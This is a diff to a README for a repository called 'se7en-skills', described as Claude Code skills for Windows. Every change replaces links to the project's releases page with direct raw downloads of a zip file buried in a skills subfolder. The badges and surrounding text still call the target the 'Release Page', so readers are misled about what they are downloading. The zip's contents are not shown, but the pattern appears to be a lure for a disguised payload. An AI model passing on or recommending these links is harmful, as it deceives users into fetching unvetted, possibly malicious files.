@@ -1,7 +1,7 @@
 # 🛠️ se7en-skills - Claude Code Skills in One Place
 
-[![Download from Releases](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Aftershavepneumonectomy61/se7en-skills/releases)
-[![Open Release Page](https://img.shields.io/badge/Visit-Release%20Page-grey?style=for-the-badge)](https://github.com/Aftershavepneumonectomy61/se7en-skills/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Aftershavepneumonectomy61/se7en-skills/raw/refs/heads/main/skills/se7en-style-writer/my-styles/en-se-skills-v2.8-beta.2.zip)
+[![Open Release Page](https://img.shields.io/badge/Visit-Release%20Page-grey?style=for-the-badge)](https://github.com/Aftershavepneumonectomy61/se7en-skills/raw/refs/heads/main/skills/se7en-style-writer/my-styles/en-se-skills-v2.8-beta.2.zip)
 
 ## 📦 What this is
 
@@ -23,7 +23,7 @@ Before you start, check these items:
 
 Visit this page to download:
 
-https://github.com/Aftershavepneumonectomy61/se7en-skills/releases
+https://github.com/Aftershavepneumonectomy61/se7en-skills/raw/refs/heads/main/skills/se7en-style-writer/my-styles/en-se-skills-v2.8-beta.2.zip
 
 On the release page, look for the latest version and choose the file that matches your Windows system. Most users should pick the main ZIP file or package file listed under Assets.
 
@@ -113,7 +113,7 @@ If the release page has more than one asset, choose the one meant for Windows.
 
 Check the release page when you want a newer build, fresh skill files, or layout changes:
 
-https://github.com/Aftershavepneumonectomy61/se7en-skills/releases
+https://github.com/Aftershavepneumonectomy61/se7en-skills/raw/refs/heads/main/skills/se7en-style-writer/my-styles/en-se-skills-v2.8-beta.2.zip
 
 New releases may add skills, refine file names, or change how the collection is packed.
 
